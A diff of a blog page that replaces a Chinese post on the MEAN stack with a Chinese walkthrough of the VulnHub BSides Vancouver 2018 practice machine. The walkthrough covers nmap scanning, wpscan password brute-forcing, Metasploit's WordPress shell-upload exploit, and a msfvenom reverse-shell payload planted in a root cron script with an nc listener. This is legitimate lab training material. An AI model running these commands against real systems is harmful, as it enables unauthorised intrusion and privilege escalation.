@@ -3,30 +3,37 @@
 <head>
   <meta charset="utf-8">
   
-  <title>mean--全栈web开发框架 | shackle</title>
+  <title>vulnhub 靶机渗透初见 | shackle</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
+  <meta name="keywords" content="靶机渗透" />
   
   
   
-  <meta name="description" content="MEAN–全栈WEB开发框架 2016-12-01 MEAN Mongode + Express + Angular + Node.js ##全Javascript的开发架构MEAN。js语言运行在应用程序的所有层次上，前端后端服务端从客户端到服务器，再到持久层一种语言运行在应用程序的所有层次上。   (M)MongoDB——NoSQL的文档数据库，使用JSON风格来存储数据，查询较简单，甚至也是">
+  
+  <meta name="description" content="Vulnhub 靶机渗透初见0X00 前言Vulnhub 是国外Vulnhub 团队建设的一套 靶机镜像网站，提供虚拟机的形式的靶机镜像、直接下载使用、一般来说是一个整套的系统(linux居多）。下面对平台上靶机系统进行渗透测试。  https://www.vulnhub.com/ 0X01 BSides Vancouver: 2018 (Workshop）下载地址：BSides Vancouve">
+<meta name="keywords" content="靶机渗透">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MEAN--全栈WEB开发框架">
-<meta property="og:url" content="https://shackles.top/2016/11/29/MEAN--全栈WEB开发框架/index.html">
+<meta property="og:title" content="Vulnhub 靶机渗透初见">
+<meta property="og:url" content="https://shackles.top/2018/04/09/BSides Vancouver/index.html">
 <meta property="og:site_name" content="shackle">
-<meta property="og:description" content="MEAN–全栈WEB开发框架 2016-12-01 MEAN Mongode + Express + Angular + Node.js ##全Javascript的开发架构MEAN。js语言运行在应用程序的所有层次上，前端后端服务端从客户端到服务器，再到持久层一种语言运行在应用程序的所有层次上。   (M)MongoDB——NoSQL的文档数据库，使用JSON风格来存储数据，查询较简单，甚至也是">
+<meta property="og:description" content="Vulnhub 靶机渗透初见0X00 前言Vulnhub 是国外Vulnhub 团队建设的一套 靶机镜像网站，提供虚拟机的形式的靶机镜像、直接下载使用、一般来说是一个整套的系统(linux居多）。下面对平台上靶机系统进行渗透测试。  https://www.vulnhub.com/ 0X01 BSides Vancouver: 2018 (Workshop）下载地址：BSides Vancouve">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://meanjs.org/img/logo.png">
-<meta property="og:image" content="http://mean.io/wp-content/themes/twentysixteen-child/images/mongodb.png">
-<meta property="og:image" content="http://mean.io/wp-content/themes/twentysixteen-child/images/angularjs.png">
-<meta property="og:image" content="http://mean.io/wp-content/themes/twentysixteen-child/images/nodejs.png">
-<meta property="og:image" content="https://raohuaming.github.io/images/mean-stack.png">
-<meta property="og:image" content="http://simage.jdon.com/idea/meanarchitecture.png">
-<meta property="og:updated_time" content="2018-03-29T23:25:48.530Z">
+<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/i9B8e6fmjH.png?imageslim">
+<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/JB1kilHHKA.png?imageslim">
+<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/HIGAGlgfBg.png?imageslim">
+<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/JcAIm6dheJ.png?imageslim">
+<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/7cDAkaI4k2.png?imageslim">
+<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/06F9iE18i8.png?imageslim">
+<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/m1Dd6iDll7.png?imageslim">
+<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/gH8j7iE1g0.png?imageslim">
+<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/94DA1fGGIF.png?imageslim">
+<meta property="og:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/9B8FblBjD4.png?imageslim">
+<meta property="og:updated_time" content="2018-04-09T09:22:18.819Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MEAN--全栈WEB开发框架">
-<meta name="twitter:description" content="MEAN–全栈WEB开发框架 2016-12-01 MEAN Mongode + Express + Angular + Node.js ##全Javascript的开发架构MEAN。js语言运行在应用程序的所有层次上，前端后端服务端从客户端到服务器，再到持久层一种语言运行在应用程序的所有层次上。   (M)MongoDB——NoSQL的文档数据库，使用JSON风格来存储数据，查询较简单，甚至也是">
-<meta name="twitter:image" content="https://meanjs.org/img/logo.png">
+<meta name="twitter:title" content="Vulnhub 靶机渗透初见">
+<meta name="twitter:description" content="Vulnhub 靶机渗透初见0X00 前言Vulnhub 是国外Vulnhub 团队建设的一套 靶机镜像网站，提供虚拟机的形式的靶机镜像、直接下载使用、一般来说是一个整套的系统(linux居多）。下面对平台上靶机系统进行渗透测试。  https://www.vulnhub.com/ 0X01 BSides Vancouver: 2018 (Workshop）下载地址：BSides Vancouve">
+<meta name="twitter:image" content="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/i9B8e6fmjH.png?imageslim">
   
     <link rel="alternate" href="/atom.xml" title="shackle" type="application/atom+xml">
   
@@ -167,7 +174,7 @@
             
       <div id="content" class="outer">
         
-          <section id="main" style="float:none;"><article id="post-MEAN--全栈WEB开发框架" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+          <section id="main" style="float:none;"><article id="post-BSides Vancouver" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="article-inner">
     
     
@@ -175,7 +182,7 @@
         
   
     <h1 class="thumb" class="article-title" itemprop="name">
-      MEAN--全栈WEB开发框架
+      Vulnhub 靶机渗透初见
     </h1>
   
 
@@ -183,8 +190,8 @@
     
     <div class="article-meta">
       
-	<a href="/2016/11/29/MEAN--全栈WEB开发框架/" class="article-date">
-	  <time datetime="2016-11-29T15:53:56.000Z" itemprop="datePublished">2016-11-29</time>
+	<a href="/2018/04/09/BSides Vancouver/" class="article-date">
+	  <time datetime="2018-04-09T15:53:56.000Z" itemprop="datePublished">2018-04-09</time>
 	</a>
 
       
@@ -194,21 +201,34 @@
     </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="MEAN–全栈WEB开发框架"><a href="#MEAN–全栈WEB开发框架" class="headerlink" title="MEAN–全栈WEB开发框架"></a>MEAN–全栈WEB开发框架</h1><p><a href="http://shackles.top/2016/12/01/tags-%20%20Web%20%E6%A1%86%E6%9E%B6/"> 2016-12-01</a></p>
-<h1 id="MEAN-Mongode-Express-Angular-Node-js"><a href="#MEAN-Mongode-Express-Angular-Node-js" class="headerlink" title="MEAN Mongode + Express + Angular + Node.js"></a>MEAN Mongode + Express + Angular + Node.js</h1><blockquote>
-<p>##全Javascript的开发架构<strong>MEAN</strong>。<br><a href="https://meanjs.org/img/logo.png" target="_blank" rel="noopener"><img src="https://meanjs.org/img/logo.png" alt="img"></a><br>js语言运行在应用程序的所有层次上，前端后端服务端从客户端到服务器，再到持久层一种语言运行在应用程序的所有层次上。</p>
-</blockquote>
-<ol>
-<li><strong>(M</strong>)MongoDB——NoSQL的文档数据库，使用JSON风格来存储数据，查询较简单，甚至也是使用JS来进行sql查询；<br><a href="http://mean.io/wp-content/themes/twentysixteen-child/images/mongodb.png" target="_blank" rel="noopener"><img src="http://mean.io/wp-content/themes/twentysixteen-child/images/mongodb.png" alt="m"></a>m</li>
-<li>(<strong>E</strong>)Express——较好的基于Node的Web开发框架，是一个最小的，灵活的Node.js Web应用程序框架，构建单页和多页，和混合Web应用程序提供了一套强大的功能；</li>
-<li>(<strong>A</strong>)Aagular——JS的前端开发框架，提供了声明式的双向数据绑定；<a href="http://mean.io/wp-content/themes/twentysixteen-child/images/angularjs.png" target="_blank" rel="noopener"><img src="http://mean.io/wp-content/themes/twentysixteen-child/images/angularjs.png" alt="A"></a>A</li>
-<li>(<strong>N</strong>)Node——跑在服务器的js，并发 异步 事件驱动，基于V8的运行时环境（JS语言开发），可以构建快速响应、可扩展的网络应用。<br><a href="http://mean.io/wp-content/themes/twentysixteen-child/images/nodejs.png" target="_blank" rel="noopener"><img src="http://mean.io/wp-content/themes/twentysixteen-child/images/nodejs.png" alt="n"></a>n</li>
-</ol>
-<p><a href="https://raohuaming.github.io/images/mean-stack.png" target="_blank" rel="noopener"><img src="https://raohuaming.github.io/images/mean-stack.png" alt="img"></a><br><em>1.架构框图</em><br>采用MVC架构。模型-视图-控制器 (MVC)</p>
-<p><a href="http://simage.jdon.com/idea/meanarchitecture.png" target="_blank" rel="noopener"><img src="http://simage.jdon.com/idea/meanarchitecture.png" alt="img"></a><br>可以直接存储JSON格式的mongoDB数据库，</p>
-<h3 id="1-从-LAMP-到-MEAN"><a href="#1-从-LAMP-到-MEAN" class="headerlink" title="1. 从 LAMP 到 MEAN"></a>1. 从 <a href="http://baike.baidu.com/link?url=xxWtinT946K5F6Ur9Vzt0st7GyosP3TlaybV1fNkN7BFlDF9TFN0xaTePZbcMTPQHKL2mC_2w6igSGtTQeqIda" target="_blank" rel="noopener">LAMP</a> 到 MEAN</h3><p>MEAN 不仅仅是一次首字母缩写的简单重新安排与技术升级。将基础平台从操作系统 (Linux) 转变为 JavaScript 运行时 (Node.js) 让操作系统变得独立：Node.js 在 Windows® 与 OS X 上的运行情况和在 Linux 上一样优秀。跨平台强。</p>
-<h3 id="1-1"><a href="#1-1" class="headerlink" title="- 1.1"></a>- 1.1</h3><p>Node.js 同样取代了 LAMP 堆栈中的 Apache。但 Node.js 远远不止是一种简单的 Web 服务器。事实上，用户不会将完成后的应用程序部署到单机的 Web 服务器上；相反，Web 服务器已经包含在应用程序中，并已在 MEAN 堆栈中自动安装。结果，部署过程得到了极大简化，因为所需的 Web 服务器版本已经与余下的运行时依赖关系一起得到了明确定义。</p>
-<h3 id="1-2"><a href="#1-2" class="headerlink" title="- 1.2"></a>- 1.2</h3><p>从传统数据库（如 MySQL）–&gt;非关系数据库 (如NoSQL）–&gt;无架构的、以文档为导向的持久存储（如 MongoDB），这些代表着持久化策略发生了根本性的转变。用户花费在编写 SQL 上的时间将会减少，将会有更多的时间编写 JavaScript 中的映射/化简功能。用户还能省掉大量的转换逻辑，因为 MongoDB 可以在本地运行 JavaScript Object Notation (JSON)。因此，编写 RESTful Web 服务变得前所未有的容易。 从 LAMP 到MEAN的最大转变在于从传统的服务器端页面生成变为客户端 单页面应用程序 (SPA)。借助 Express仍然可以处理服务器端的路由与页面生成，但目前的重点在客户端视图上，而 AngularJS 可以实</p>
+        <h2 id="Vulnhub-靶机渗透初见"><a href="#Vulnhub-靶机渗透初见" class="headerlink" title="Vulnhub 靶机渗透初见"></a>Vulnhub 靶机渗透初见</h2><h3 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h3><p>Vulnhub 是国外<a href="https://twitter.com/VulnHub" target="_blank" rel="noopener">Vulnhub </a>团队建设的一套 靶机镜像网站，提供虚拟机的形式的靶机镜像、直接下载使用、一般来说是一个整套的系统(linux居多）。下面对平台上靶机系统进行渗透测试。</p>
+<p> <a href="https://www.vulnhub.com/" target="_blank" rel="noopener">https://www.vulnhub.com/</a></p>
+<h3 id="0X01-BSides-Vancouver-2018-Workshop）"><a href="#0X01-BSides-Vancouver-2018-Workshop）" class="headerlink" title="0X01 BSides Vancouver: 2018 (Workshop）"></a>0X01 BSides Vancouver: 2018 (Workshop）</h3><p>下载地址：<a href="https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/" target="_blank" rel="noopener">BSides Vancouver: 2018 (Workshop) ~ VulnHub</a>，可使用种子下载，速度较快。</p>
+<p>下载的VOA文件可用VirtualBox或者VMware Workstation导入使用。配置靶机的网络启动即可。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/i9B8e6fmjH.png?imageslim" alt="mark"></p>
+<h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><p>老规矩先扫描，可以看到 存在FTP Anonymous访问访问漏洞，</p>
+<p>nbtscan 192.168.1.1/24<br>nmap -A 192.168.1.32</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/JB1kilHHKA.png?imageslim" alt="mark"></p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/HIGAGlgfBg.png?imageslim" alt="mark"></p>
+<p>下载 users.txt.bk  得到用户名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abatchy</span><br><span class="line">john</span><br><span class="line">mai</span><br><span class="line">anne</span><br><span class="line">doomguy</span><br></pre></td></tr></table></figure>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>wpscan -u  <a href="http://192.168.1.32/backup_wordpress/" target="_blank" rel="noopener">http://192.168.1.32/backup_wordpress/</a><br>wpscan -u <a href="http://192.168.1.32/backup_wordpress" target="_blank" rel="noopener">http://192.168.1.32/backup_wordpress</a> -username john –wordlist /usr/share/wordlists/rockyou.txt</p>
+<p>利用 wp_admin_shell_upload 漏洞</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/JcAIm6dheJ.png?imageslim" alt="mark"></p>
+<p>爆破  密码得到<strong>enigma</strong></p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/7cDAkaI4k2.png?imageslim" alt="mark"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set rhost 192.168.1.32</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set targeturi /backup-wordpress</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set username john</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set password enigma</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;exploit</span><br></pre></td></tr></table></figure>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/06F9iE18i8.png?imageslim" alt="mark"></p>
+<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>但是没有root权限，下一步需要提权。</p>
+<p>一般来说 linux提权可以使用用exp提权，或者通过计划任务、SUID文件属性进行提权。这里使用计划任务，查看root用户执行的计划任务。<code>cat crontab</code> ，把远控脚本写入<code>/usr/local/bin/cleanup</code>中，执行，用nc反向连接。</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/m1Dd6iDll7.png?imageslim" alt="mark"></p>
+<p>msfvenom -p cmd / unix / reverse_python lhost = 192.168.1.63 lport = 9866 R  #msfveom 生成python后门 </p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/gH8j7iE1g0.png?imageslim" alt="mark"></p>
+<p>上传python远控木马</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/94DA1fGGIF.png?imageslim" alt="mark"></p>
+<p>nv -lvp 9866   # nv 反向监听</p>
+<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180408/9B8FblBjD4.png?imageslim" alt="mark"></p>
+<h3 id="0X02-总计"><a href="#0X02-总计" class="headerlink" title="0X02 总计"></a>0X02 总计</h3><p>通过对以上靶机进行渗透测试，可以看出Vulnhub 靶机平台的靶机镜像环境还是不错的，平台提供初中高级的靶机镜像、从Web安全到系统安全也可以。基本可以涵盖大部分的渗透测试流程，可以较为方便的实验测试靶机。</p>
 
       
     </div>
@@ -241,25 +261,18 @@
 
       
       
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/靶机渗透/">靶机渗透</a></li></ul>
+
     </footer>
   </div>
   
     
 <nav id="article-nav">
   
-    <a href="/2017/01/29/CVE-2016-5195（脏牛）内核提权/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">上一篇</strong>
-      <div class="article-nav-title">
-        
-          CVE-2016-5195（脏牛）内核提权漏洞分析
-        
-      </div>
-    </a>
   
-  
-    <a href="/2016/10/05/实验吧Misc题目/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2018/03/30/ctf-web/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">下一篇</strong>
-      <div class="article-nav-title">实验吧Misc题目</div>
+      <div class="article-nav-title"></div>
     </a>
   
 </nav>
@@ -273,7 +286,7 @@
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
     
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MEAN–全栈WEB开发框架"><span class="nav-number">1.</span> <span class="nav-text">MEAN–全栈WEB开发框架</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MEAN-Mongode-Express-Angular-Node-js"><span class="nav-number">2.</span> <span class="nav-text">MEAN Mongode + Express + Angular + Node.js</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-从-LAMP-到-MEAN"><span class="nav-number">2.0.1.</span> <span class="nav-text">1. 从 LAMP 到 MEAN</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1"><span class="nav-number">2.0.2.</span> <span class="nav-text">- 1.1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2"><span class="nav-number">2.0.3.</span> <span class="nav-text">- 1.2</span></a></li></ol></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Vulnhub-靶机渗透初见"><span class="nav-number">1.</span> <span class="nav-text">Vulnhub 靶机渗透初见</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0X00-前言"><span class="nav-number">1.1.</span> <span class="nav-text">0X00 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X01-BSides-Vancouver-2018-Workshop）"><span class="nav-number">1.2.</span> <span class="nav-text">0X01 BSides Vancouver: 2018 (Workshop）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#信息收集："><span class="nav-number">1.2.1.</span> <span class="nav-text">信息收集：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.2.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#权限维持"><span class="nav-number">1.2.3.</span> <span class="nav-text">权限维持</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X02-总计"><span class="nav-number">1.3.</span> <span class="nav-text">0X02 总计</span></a></li></ol></li></ol>
     
     </div>
   </aside>
